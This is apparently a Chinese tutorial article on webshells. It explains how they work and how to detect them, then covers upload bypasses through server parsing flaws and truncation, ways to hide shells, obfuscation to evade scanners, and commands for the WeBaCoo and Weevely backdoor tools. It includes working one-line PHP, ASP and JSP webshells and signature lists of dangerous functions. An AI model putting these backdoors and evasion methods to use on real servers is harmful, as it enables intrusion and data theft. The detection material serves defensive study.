web后门泛指webshell，其实就是一段网页代码，包括ASP. ASP.NET. PHP. JSP. 代码等。由于这些代码都运行在服务器端，攻击者通过这段精心设计的代码，在服务器端进行一些危险的操作获得某些敏感的技术信息，或者通过渗透操作提权，从而获得服务器的控制权。这也是攻击者控制服务器的一个方法，比一般的入侵更具隐蔽性。

Webshell是什么 

Shell(计算机壳层)

在计算机科学中，Shell俗称壳（用来区别于核），是指“为使用者提供操作界面”的软件（命令解析器）。它类似于DOS下的command.com和后来的cmd.exe。它接收用户命令，然后调用相应的应用程序。Shell 编程跟 java、php 编程一样，只要有一个能编写代码的文本编辑器和一个能解释执行的脚本解释器就可以了。
Linux 的 Shell 种类众多，常见的有：
Default
Bourne Shell（/usr/bin/sh或/bin/sh）
Bourne Again Shell（/bin/bash）
C Shell（/usr/bin/csh）
K Shell（/usr/bin/ksh）
Shell for Root（/sbin/sh）

Webshell

webell顾名思义：web指的是web服务器，而shell是用脚本语言编写的脚本程序，webshell就是web的一个管理工具，可以对web服务器进行操作的权限，也叫webadmin。webshell一般是被网站管理员用于网站管理、服务器管理等等一些用途，但是由于webshell的功能比较强大，可以上传下载文件，查看数据库，甚至可以调用一些服务器上系统的相关命令（比如创建用户，修改删除文件之类的），通常被攻击者利用，攻击者在入侵了一个网站后，通常会将asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。攻击者通过一些上传方式，将自己编写的webshell上传到web服务器的页面的目录下，然后通过页面访问的形式进行入侵，或者通过插入一句话连接本地的一些相关工具直接对服务器进行入侵操作。

分类

webshell根据脚本可以分为PHP脚本木马，ASP脚本木马，也有基于.NET的脚本木马和JSP脚本木马。在国外，还有用python脚本语言写的动态网页，当然也有与之相关的webshell。
根据功能分为大马与小马：

小马

一句话木马短小精悍，而且功能强大，隐蔽性非常好，在入侵中始终扮演着强大的作用。

大马

大马的工作模式简单的多，他没有客户端与服务端的区别，就是一些脚本大牛直接把一句话木马的服务端整合到了一起，通过上传漏洞将大马上传，然后复制该大马的url地址直接访问，在页面上执行对web服务器的渗透工作。但是有些网站对上传文件做了严格的限制，因为大马的功能较多，所以体积相对较大，很有可能超出了网站上传限制，但是小马的体积可以控制（比如把代码复制很多遍，或者在一个乱码文件中夹入代码），但是小马操作起来比较繁琐，可以先上传小马拿到webshell，然后通过小马的连接上传大马拿到服务器。
Default
大马
体积大、代码量大、功能复杂
调用系统函数
隐藏性；代码加密
 
小马
主要为上传功能
 
一句话木马
代码简短；通常一两行
使用灵活，可以单独文件，也可以插入正常文件
变形种类多，难以通过常规正则检测
原理不变，代码执行+数据接收

原理

webshell含有相同的本质，即：执行系统命令的函数+接收web参数的功能函数。使用webshell就像打开一个特殊的web页面，只有当传入的参数正确时才能顺利使用。例如：1.php 内容为：<?php @eval(@_POST["A"]);?>只有打开1.php页面且数据包参数有”A”时，才能正确连接使用该后门。通过连接webshell，执行系统命令，可以查看计算机本机文件，查看用户、密码等敏感信息，还可以直接生成、修改文件（生成木马病毒文件或者网页挂马，数据库添加xss代码等），以及直接下载上传更多文件。
简单webshell
Default
JSP的简单webshell
<%Runtime.getRuntime().exec(request.getParameter("xxx"));%>
 
ASP的简单webshell
<%evalrequest("xxx")%>
 
PHP的简单webshell
<?php $a=eval($_GET["xxx"]);?>

特点

    存在系统调用的命令执行函数，如eval、system、cmd_shell、assert等；
    存在系统调用的文件操作系统函数，如fopen、fwrite、readdir等；
    存在数据库操作函数，调用系统自身的存储过程来连接数据库操作；
    隐匿性与伪装性，可隐藏到正常的web源码中；
    访问ip、次数少、页面孤立；
    会产生payload流量，可以通过流量镜像与web日志进行检测；
    变种多，通过各种函数加密，绕过检测。

变种类型

    函数调用
    拼接语句
    字符操作
    编码混淆
    其他：文件名利用

危害

    长期控制web服务器、主机；
    上传任意文件或者其他危害性病毒，例如勒索、挖矿等，也可以从主机下载任意文件；
    修改web主页，篡改图片，造成不良社会影响(例如篡改国旗等)；
    偷窃删除数据(数据库数据、用户密码、个人信息之类)；
    控制服务器当肉鸡、攻击跳板，对其他用户实现DDos等攻击。

Webshell检测

webshell的运行流程：hacker -> HTTP Protocol -> Web Server -> CGI。简单来看就是这样一个顺序：黑客通过浏览器以HTTP协议访问web server上的一个CGI文件。棘手的是，webshell就是一个合法的TCP连接，在TCP/IP的应用层之下没有任何特征（当然不是绝对的），只有在应用层进行检测。黑客入侵服务器，使用webshell，不管是传文件还是改文件，必然有一个文件会包含webshell代码，很容易想到从文件代码入手，这是静态特征检测；webshell运行后，B/S数据通过HTTP交互，HTTP请求/响应中可以找到蛛丝马迹，这是动态特征检测。 
目前针对Webshell的特征检测一般是通过特征比对及文件属性异常的静态检测和基于访问情况、行为模式特征的动态检测方式进行查杀，由于窃密型Webshell通常会伪装成正常的WEB脚本文件，静态特征检测及动态行为检测都无法有效的针对此类后门进行检测。

静态检测

静态特征检测是指脚本文件中所使用的关键词、高危函数、文件修改的时间、文件权限、文件的所有者以及和其他文件的关联性等多个维度的特征进行检测。即先建立一个恶意字符串特征库，例如：“组专用大马|提权|木马|PHP\s?反弹提权cmd执行”，“WScript.Shell、 Shell.Application、Eval()、Excute()、Set Server、Run()、Exec()、ShellExcute()”，同时对WEB文件修改时间，文件权限以及文件所有者等进行确认。通常情况下 WEB文件不会包含上述特征或者特征异常，通过与特征库的比对检索出高危脚本文件。

危险函数
命令执行函数
Default
php：exec()、eval()、assert()、shell_exec()、system()
jsp：Runtime.exec(String cmd)
接受web参数函数
Default
php：$_POST、 $_GET 、$_REQUEST
jsp：request.getParameter()
变形函数(编码/字符串变形)
Default
php：base64,sha1,md5, preg_replace,pack(hex)
文件操作函数
Default
php：fpassthru()、fsockopen()

优点

可快速检测，快速定位。

缺点

容易误报，无法对加密或者经过特殊处理的webshell文件进行检测。无法查找0day型webshell,而且容易被绕过。尤其是针对窃密型webshell无法做到准确的检测，因为窃密型webshell通常具有和正常的web脚本文件具有相识的特征。所以用这样一种思路：强弱特征。即把特征码分为强弱两种特征，强特征命中则必是webshell；弱特征由人工去判断。

动态检测

动态特征检测通过webshell运行时使用的系统命令或者网络流量及状态的异常来判断动作的威胁程度，webshell通常会被加密从而避免静态特征的检测，当webshell运行时就必须向系统发送系统命令来达到控制系统或者操作数据库的目的，通过检测系统调用来检测甚至拦截系统命令被执行，从行为模式上深度检测脚本文件的安全性。先前我们说到过webshell通信是HTTP协议。只要我们把webshell特有的HTTP请求/响应做成特征库，加到IDS里面去检测所有的HTTP请求就好了。webshell起来如果执行系统命令的话，会有进程。Linux下就是nobody用户起了bash，Win下就是IIS User启动cmd，这些都是动态特征。再者如果黑客反向连接的话，那更容易检测了，Agent和IDS都可以抓现行。Webshell总有一个HTTP请求，如果我在网络层监控HTTP，并且检测到有人访问了一个从没反问过得文件，而且返回了200，则很容易定位到webshell，这便是http异常模型检测，就和检测文件变化一样，如果非管理员新增文件，则说明被人入侵了。

优点

可用于网站集群，对新型变种脚本有一定的检测能力。

缺点

针对特定用途的后门较难检测，实施难度较大。

日志分析

使用Webshell一般不会在系统日志中留下记录，但是会在网站的web日志中留下Webshell页面的访问数据和数据提交记录。日志分析检测 技术通过大量的日志文件建立请求模型从而检测出异常文件，称之为：HTTP异常请求模型检测。例如：一个平时是GET的请求突然有了POST请求并且返回 代码为200、某个页面的访问者IP、访问时间具有规律性等。

优点

采用了一定数据分析的方式，网站的访问量达到一定量级时这种检测方法的结果具有较大参考价值。

缺点

存在一定误报，对于大量的访问日志，检测工具的处理能力和效率会较低。

流量检测

根据抓取的流量显示，对WebShell所做的操作的结果，都会以字符串的形式返回给菜刀进行处理，并显示出来。字符串形式为 "->|xxxx|<-"，为菜刀WebShell的特征字符。若发现成功利用菜刀WebShell的行为，基于该特征字符，将会发现此类攻击事件。

优点

可实时检测并阻止，还原攻击场景，快速定位主机和入侵者。

缺点

无法检测加密payload，流量镜像部署成本，甚至有可能拖累服务。

统计学检测

信息熵
数学上的抽象概念,这里把信息熵理解成某种特定信息的出现概率（离散随机事件的出现概率）。一个系统越是有序，信息熵就越低。反之，一个系统越是混乱，信息熵就越高，为webshell的可能性越高。

文件中的最长单词
正常文件中单词是比较短的,当一个文件中的最长单词很长时，这些长单词是很可疑的。一般webshell经过base64编码后会形成一个长字符串。

优点：
对于混淆代码的识别能力较强。

缺点：
限制于代码编写者的写作习惯与混淆方式，对于附加在正常文件里的恶意代码检测能力较弱。

已知后门对比

文件相识度
大部分入侵者为脚本小子的级别，并不会自己生成webshell，而是从网上获取他人的脚本且几乎不改变，这种情况下文件相似度极大。

文件hash、md5值对比
对比文件hash和md5的值。

优点：
正确率高

缺点：
需要大量的数据组成样本库，且大量文件对比的情况下检测速度较慢。

如何上传Webshell

解析漏洞上传

现在对于不同的web服务器系统对应的有不同的web服务端程序，windows端主流的有iis，linux端主流的有nginx。这些服务对搭建web服务器提供了很大的帮助，同样也对服务器带来隐患，这些服务器上都存在一些漏洞，很容易被黑客利用。
iis目录解析漏洞
Default
比如：/xx.asp/xx.jpg。虽然上传的是JPG文件，但是如果该文件在xx.asp文件夹下，那个iis会把这个图片文件当成xx.asp解析，
这个漏洞存在于iis5.x/6.0版本。
文本解析漏洞
Default
比如：xx.asp;.jpg。在网页上传的时候识别的是jpg文件，但是上传之后iis不会解析;之后的字符，同样会把该文件解析成asp文件，
这个漏洞存在于iis5.x/6.0版本。
文件名解析
Default
比如：xx.cer/xx.cdx/xx.asa。在iis6.0下，cer文件，cdx文件，asa文件都会被当成可执行文件，
里面的asp代码也同样会执行。（其中asa文件是asp特有的配置文件，cer为证书文件）。
fast-CGI解析漏洞
Default
在web服务器开启fast-CGI的时候，上传图片xx.jpg。内容为：<?php fputs(fopen('shell.php','w'),'<?php eval($_POST[shell])?>');?>
这里使用的fput创建一个shell.php文件，并写入一句话。访问路径xx.jpg/.php，
就会在该路径下生成一个一句话木马shell.php。这个漏洞在IIS 7.0/7.5，Nginx 8.03以下版本存在。
语言环境：PHP，prel，Bourne Shell，C等语言。
注：fast-CGI是CGI的升级版，CGI指的是在服务器上提供人机交互的接口，
fast-CGI是一种常驻型的CGI。因为CGI每次执行时候，都需要用fork启用一个进程，
但是fast-CGI属于激活后就一直执行，不需要每次请求都fork一个进程。比普通的CGI占的内存少。
apache解析漏洞
Default
apache解析的方式是从右向左解析，如果不能解析成功，就会想左移动一个，
但是后台上传通常是看上传文件的最右的一个后缀，所以根据这个，可以将马命名为xx.php.rar，
因为apache解析不了rar，所以将其解析为php，但是后台上传点就将其解析为rar，这样就绕过了上传文件后缀限制。

截断上传

在上传图片的时候，比如命名1.asp .jpg(asp后面有个空格)，在上传的时候，用NC或者burpsuite抓到表单，将上传名asp后面加上%00（在burpsuite里面可以直接编辑HEX值，空格的HEX值为20，将20改为00），如果HEX为00的时候表示截断，20表示空格，如果表示截断的时候就为无视脚本中的JPG验证语句，直接上传ASP。

后台数据库备份

在一些企业的后台管理系统中，里面有一项功能是备份数据库（比如南方cms里面就有备份数据库的功能）。可以上传一张图片，图片里面含有一句话木马，或者将大马改成jpg格式，然后用数据库备份功能，将这张图片备份为asp等其他内容可以被解析为脚本语句的格式，然后再通过web访问就可以执行木马了，但是这种方法很老了，现在大多数的cms已经把这种备份的功能取消了，或者禁用了。

利用数据库语句上传

mysql数据库into outfield
这种方式的前提必须是该网站有相应的注入点，而且当前用户必须要有上传的权限，而且必须有当前网页在服务器下的绝对路径。方法是用联合查询，将一句话木马导入到网站下边的一个php文件中去，然后使用服务端连接该网站。但是上述方法条件过于苛刻，一般遇到的情况很少。

建立新表写入木马
一些开源cms或者自制的webshell会有数据库管理功能，在数据库管理功能里面有sql查询功能，先使用create table shell(codetext);创建一个名字叫做shell的表，表里面有列明叫做code，类型为text。然后使用insert into shell(code) values(‘一句话马’)，这里讲shell表中的code列赋值为一句话的马，然后通过自定义备份，将该表备份为x.php;x然后就被解析成为php然后执行了，这里不是x.php;x就一定能够解析为php，不同的web服务器上面的服务程序不同，然后过滤规则也不同，可能会使用其他的方式。

phpMyadmin 设置错误
phpMyadmin用来管理网站数据库的一个工具，其中config.inc.php为其配置文件，在查看的该文件的时候，如果$cfg[‘Servers’][$i][‘auth_type’]参数的值设置没有设置（默认为config）说明在登陆数据库的时候没有做相应的验证，可以直接连入数据库，而且在Mysql在一些版本下面默认登陆都是以root用户进行登陆（即管理员），所以登陆进去为最大权限。但是root一般只能本地登陆，所以必须创建一个远程登陆用户。用远程登陆用户登陆之后，创建一个表，然后再将一句话木马写入。

隐藏Webshell

在上传webshell的时候必须要进行webshell的隐藏工作。隐藏webshell，第一个目的是不让网站管理员发现马将其删掉，第二个目的是为了不被其他的Hacker发现了这个文件并加以利用。

大马的隐藏

不死僵尸
windows系统存在系统保留文件夹名，windows不允许用这些名字来命名文件夹保留文件夹：aux|prn|con|nul|com1|com2|com3|com4|com5|com6|com7|com8|com9|lpt1|lpt2|lpt3|lpt4|lpt5|lpt6|lpt7|lpt8|lpt。但是这些可以使用windows的copy命令创建。
clsid隐藏
Default
windows每一个程序都有一个clsid，如果将一个文件夹命令为x.{程序clsid}。
创建这样一个带有clsid的文件夹将其命名为相应的程序可以迷惑网络管理员的实现，
比如进入回收站文件夹中创建这样一个带有回收站clsid的文件夹，在里面再copy一个保留字asp，
还可以使用：
attrib +h +s +d/s /d
修改该文件的属性，将其隐藏，一般windows都是默认不显示隐藏文件的，
而且回收站文件夹是自动创建的，这样可以达到隐藏一个不死webshell到服务器中去。
驱动隐藏技术
Default
原理是在于，在windows文件系统中，
打开文件夹的时候系统会发送一个IRP_MJ_DIRECTORY_CONTROL函数，这个函数可以分配一个缓冲区，
将该文件夹下的子文件夹遍历处理得到的信息存放至缓冲区，在遍历的时候，寻找匹配的文件名，
如果文件名匹配，就绕过当前文件夹或者文件，对于绕过的原理，我查询了下代码，根据我的理解，
它是根据将遍历的指针在查询到目标文件的时候，加上该文件的偏移量，不扫描目标文件夹，直接跳过。
对于这种技术的实施，虽然网上很多C的源码，但是操作起来有一定的困难，因为头文件的支持，
还有系统的支持（不同系统的文件系统会不同），在网上查找到了Easy File Locker程序，
需要将其安装至web服务器上，对目标文件设置权限。
注册表隐藏
Default
注册表路径：HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\explorer＼Advanced\Folder\Hidden\SHOWALL
在这个路径下有一个CheckedValue的键值，把他修改为0，如果没有CheckValue这个key直接创建一个，
将他赋值为0，然后创建的隐藏文件就彻底隐藏了，即时在文件夹选项下把“显示所有文件”
也不能显示了。

一句话木马的隐藏

头文件包含隐藏
在web里面的一些脚本文件中，有些文件里面有包含语句，可以利用这种包含方法包含一句话文件，在访问这个页面会直接调用这些一句话。asp包含语句：<!--#includefile=”文件路径”-->，直接填入路径，文件路径是web服务器上的路径。可以使用站长助手将一句话NTFS流小马写入图片里面，将路径的‘\’改‘:’写入之后图片是显示不了的，然后找到web服务器上的一个asp文件，在文件的开始部分写上include语句，<!–#includefile=”inc:1.jpg”–>。文件包含可以解析NTFS流为asp，包含之后，我们访问那个asp文件就包含了一句话，这样就隐藏了一句话。

配置文件隐藏一句话(PHP)
在拿到PHP的webshell之后，可以利用php.ini隐藏文件，编辑配置文件，其中一个项功能是将某一个文件的内容添加到任意界面的页眉页脚：auto_prepend_file =hehe.php 然后看include_path = “E:\PHPnow-1.5.6\htdocs;”这个配置信息表示加载页眉页脚的文集位置，path规则是”\path1;\path2″，表示将path1路径的文件夹下的页眉页脚文件添加到path中的文件中去，因为这里是一个‘.’表示根路径，这里就相当于添加到了主页上面去了，然后hehe.asp文件里面写上一句话，就可以通过php添加页眉的共能，将一句话写入网站首页。

404小马
404小马在访问的时候显示出来一个404页面不存在的页面，但是实际上木马代码已经执行，一般都是按5次shift可以将它调用出来。

关于Webshell的免杀

构造法绕过检测(PHP)

一般的检测程序会过滤这样”_POST”,”system”,”call_user_func_array”这样的字符，这个时候可以用构造法绕过一些检测程序，基本原理是，php每一个字符都对应了一个二进制的值，可以采用异或的方式，让马中的一个字符用两个字符异或后的值来代替。

正则表达式代替法(PHP)

php中有一个函数preg_replace()函数，这个函数可以实现正则表达式的替换工作。用替换绕过检测系统还需要php脚本语言里面的一个函数特性，函数在调用的时候，如果函数里面的参数的值里面含有命令，就会执行这个命令。

即时生成法(PHP)

在使用头文件包含的时候，所包含头文件php很容易被扫描器扫描到，这时候可以使用file_put_content创建一个文件，里面写如php的一句话马。在访问之前先生成马，但是这个函数比较敏感，很容易被杀。

回避法(asp)

因为有的asp服务器为了防止一句话马，会过滤<%,%>，可以使用：<scriptlanguage=VBScriptrunat=server>execute request("cmd")</Script>功能相同，就是换个形式。回避特定脚本语言：aspx一句话<script language="C#" runat="server">WebAdmin2Y.x.y aaaaa = new WebAdmin2Y.x.y("add6bb58e139be10");</script>这里使用C#语言写一句话马。

拆分法(asp)

将<%eval request(“x”)%>拆分为<%Y=request(“x”)%><%eval(Y)%>，虽然绕过的可能性很小，但是也是一种绕过手法，也许有的服务器，做了很多高大上的扫描方式，但是遗漏小的问题。

乱码变形(ANSI -> Unicode加密)
Default
<%eval request("#")%>变形为“┼攠數畣整爠煥敵瑳∨∣┩愾”
eval(eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))("brute"))%>

上面一行代码是采用了ascii加密的方法，chr(114)代表的是ascii中的编号为114个那个字符，即r。上述代码转换后的代码为：
Default
<%eval (eval(request("brute"))%>

大马免杀

base 64 code 编码
大马的免杀可以通过将大马的代码进行压缩，压缩之后在进行base64的加密算法，然后在大马的末尾添加@eval(gzinflate(base64_decode($code)));就可以执行脚本了。其中，$code变量是用来存放base64的code码，执行的时候先gzinflate解压，在eval执行。其实这种不能真正意义上的免杀，因为base 64 code和eval还是回被列入特征码行列，在过扫描器的时候同样会被杀掉。

ROT13编码(PHP)
  str_rot13是php用来编码的一个函数。可以利用它来编码脚本代码来绕过特征码的检测。

其他编码
一般杀软和扫描器都会用特征码来判断是否有病毒，在对大马或者小马，一句话马做免杀处理的时候，一般都会用php或者asp脚本中加密类的函数来加密绕过扫描器（比如base64，rot13等），但是我觉得可以自己编写加密算法，然后使用自己编写的加密算法加密脚本代码就可以绕过一些特征码的。可以使用一些凯撒密码，移位加密等加密手段的思想，写一段加密算法，然后将脚本代码进行加密，然后base64，rot3这样的特征码就会消失，或者可以不那么麻烦，直接用自制的加密算法加密特征码，然后再使用的时候将其解密就行了。还可以使用DES，RSA这样的密钥加密算法也可以，一般的大马都会有一个密码的登陆框，可以将登陆脚本的密码跟解密密钥联动起来，输入正确的密码后才能够解析，一方面是为了逃过扫描器与杀软的查杀，另一方便，这个大马即使被别人拿到了，也无法解密，看到其中的源码。

Webacoo

WeBaCoo （Web Backdoor Cookie） 是一款隐蔽的脚本类Web后门工具。设计理念是躲避AV、NIDS、IPS、网络防火墙和应用防火墙的查杀，提供混淆和原始两种后门代码（原始代码较难检测）。WebBaCoo 使用HTTP响应头传送命令执行的结果，Shell命令经过Base64编码后隐藏在Cookie头中。
安装
Default
Kali Linux 下默认位于：
/usr/bin 目录下
 
使用git 安装
git clone git://github.com/anestisb/WeBaCoo.git
 
官网
http://sbechtsoudis.com/archiive/webacoo/index.html

常见使用方法
生成模式(后门生成)
Default
使用默认配置生成模糊后门代码
webacoo -g -o backdoor.php 
#backdoor.php为自定义后门文件名
 
使用exec有效载荷生成混淆后门代码
webacoo -g -o backdoor.php -f 3  
#backdoor.php为自定义后门文件名 3表示exec方法
 
使用popen有效载荷生成原始后门代码
webacoo -g -o backdoor.php -f 5 -r 
#backdoor为自定义后门文件名 5表示popen方法
终端模式(后门利用)
Default
使用默认配置访问服务器
webacoo -t -u http://xxx/backdoor.php 
#-u 后门路径
 
使用"Cookie-name"作为Cookie名称、"TXT"作为分隔符访问服务器
webacoo -t -u http://xxx/backdoor.php -c "Cookie-name" -d "TtT" 
#Cookie-name 与 TtT 为自定义内容
 
使用一般代理
webacoo -t -u http://xxx/backdoor.php -c "Cookie-name" -d "TtT" -p XX.XX.XX.XX:XXXX 
#Cookie-name 与 TtT 为自定义内容 XX替换为相应的ip和端口号
 
使用tor代理
webacoo -t -u http://xxx/backdoor.php -c "Cookie-name" -d "TtT" -p tor 
#Cookie-name 与 TtT 为自定义内容
参数解释
Default
-f FUNCTION ：使用PHP系统函数 system、shell_exec、exec、passthru、popen ，按顺序FUNCTION分别为数字1、2、3、4、5
-g：生成后门
-o：指定生成的后门文件名
-u URL：后门路径
-e CMD：单独命令执行模式 需要添加 -t 和 -u参数
-m METHOD：选择HTTP请求方式，默认为GET
-c COOKIE：Cookie的名字，默认为：M-cookie
-d DELIM：指定分隔符 默认为随机
-p PROXY：使用代理
-v LEVEL：打印的详细程度。默认0 无附加信息，1打印HTTP头，2打印HTTP头和数据
-h：显示帮助文件并退出
-update：更新
mysql-cli：MySQL命令行模式
psql-cli：Postgres命令行模式
upload 使用POST上传文件
download：下载文件
stealth：通过.htaccess 处理增加的隐形模块

Weevely

Weevely是一款python编写的webshell管理工具，作为编写语言使用python的一款工具，它最大的优点就在于跨平台，可以在任何安装过python的系统上使用。可以算作是linux下的一款菜刀替代工具（限于php）,总的来说还是非常不错的一款工具。
它有30多种可完成自动管理渗透后期任务的功能模块。这些模块能够：执行命令和浏览远程文件系统；检测常见的服务器配置问题；创造TCP shell和reverse shell；在被测主机上安装HTTP代理；利用目标主机进行端口扫描。
使用HTTP Cookie作为后门通信的载体；
支持密码认证。
安装
Default
Kali Linux 自带。
基础用法
Default
生成webshell
weevely generate <shell密码> <生成目录>
 
连接webshell
weevely <URL> <password> [cmd]
 
查看系统信息
system_info
 
查看php配置文件
audit_phpconf
 
系统提权
sql_console
 
对数据库进行脱裤
sql_dump
 
子网扫描
net_scan